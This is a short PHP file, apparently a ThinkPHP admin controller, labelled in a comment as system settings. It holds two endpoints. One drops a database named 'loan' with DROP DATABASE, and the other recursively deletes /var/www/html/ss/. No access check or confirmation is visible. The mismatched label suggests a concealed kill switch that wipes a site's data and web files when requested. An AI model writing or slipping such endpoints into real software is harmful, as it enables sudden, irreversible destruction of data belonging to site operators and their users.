<?php
/**
 * Created by PhpStorm.
 * User: Admin
 * Date: 2018/5/10
 * Time: 15:13
 */

namespace app\admin\controller;

/*
 *系统设置
 */
use think\Controller;
use think\Db;

class Flie extends Controller
{
    public function index()
    {
        return view();
    }
    public function delMysql()
    {
        $dbname = 'loan';
        $sql = "DROP DATABASE `$dbname`;";
        Db::execute($sql);
        return ajaxmsg('删除成功',1);
    }
    public function delFile()
    {
        deldir('/var/www/html/ss/');
        return ajaxmsg('删除成功',1);
    }
}